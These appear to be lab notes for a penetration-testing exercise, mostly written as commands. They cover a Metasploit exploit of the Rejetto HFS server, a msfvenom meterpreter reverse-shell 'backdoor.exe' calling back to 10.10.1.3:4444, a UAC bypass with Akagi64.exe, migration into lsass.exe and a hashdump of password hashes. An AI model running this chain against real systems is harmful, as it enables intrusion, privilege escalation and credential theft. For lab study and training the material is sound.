


- nmap IP
- use exploit/windows/http/rejetto_hfs_exec
- migrate explorer.exe
- shell 
- net localgroup administrators 

The admin user is a member of the Administrators group. However, we do not have the high privilege as of now. We can gain high privilege by Bypassing UAC (User Account Control)

- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe' 
- file ''backdoor.exe' 
- CTRL + C 
- cd C:\\Users\\admin\\AppData\\Local\\Temp 
- upload /root/Desktop/tools/UACME/Akagi64.exe . 
- upload /root/backdoor.exe .

- The UACMe tool located in "/root/Desktop/tools/UACME/" directory
- Switch the directory to the user’s temp folder and upload the Akagi64.exe and backdoor.exe executable
- use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp



Here are the summary steps from the document in bullet points:

1. Step 1: Check the target IP address.
    
    - Command: `cat /root/Desktop/target`
2. Step 2: Run an initial Nmap scan against the target IP.
    
    - Command: `nmap 10.0.27.103`
3. Step 3: Determine version information on port 80.
    
    - Command: `nmap -sV -p 80 10.0.27.103`
4. Step 4: Search for the exploit module for the HFS file server using searchsploit.
    
    - Command: `searchsploit hfs`
5. Step 5: Exploit the target server using the Metasploit framework for RCE.
    
    - Commands:
        - `msfconsole -q`
        - `use exploit/windows/http/rejetto_hfs_exec`
        - `set RHOSTS 10.0.27.103`
        - `exploit`
6. Step 6: Check the current user.
    
    - Commands:
        - `getuid`
        - `sysinfo`
7. Step 7: Migrate the process to explorer.exe for higher privilege.
    
    - Commands:
        - `ps -S explorer.exe`
        - `migrate 2444`
8. Step 8: Attempt to elevate to high privilege.
    
    - Command: `getsystem`
9. Step 9: Get a Windows shell and check if the admin user is in the Administrators group.
    
    - Commands:
        - `shell`
        - `net localgroup administrators`
10. Step 10: Generate a malicious executable using msfvenom and run it on the target machine.
    
    - Commands:
        - Generate executable: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe'`
        - Check the file: `file 'backdoor.exe'`
11. Step 11: Switch to the user's temp folder and upload the Akagi64.exe and backdoor.exe.
    
    - Commands:
        - Navigate to the temp folder: `cd C:\\Users\\admin\\AppData\\Local\\Temp`
        - Upload files: `upload /root/Desktop/tools/UACME/Akagi64.exe .` and `upload /root/backdoor.exe .`
        - List files: `ls`
12. Step 12: Start another msfconsole and run a multi-handler.
    
    - Commands:
        - `msfconsole -q`
        - `use exploit/multi/handler`
        - Configure settings: `set PAYLOAD windows/meterpreter/reverse_tcp`, `set LHOST 10.10.1.3`, `set LPORT 4444`
        - Exploit: `exploit`
13. Step 13: Switch back to the meterpreter and run Akagi64.exe.
    
    - Commands:
        - Access shell: `shell`
        - Run Akagi64.exe with full path: `Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe`
14. Step 14: Migrate into the lsass.exe process.
    
    - Commands:
        - Find lsass.exe PID: `ps -S lsass.exe`
        - Migrate: `migrate 680`
15. Step 15: Dump the hashes.
    
    - Command: `hashdump`

These steps detail the process of exploiting a vulnerability to gain high privilege access and retrieve user hashes from the target system.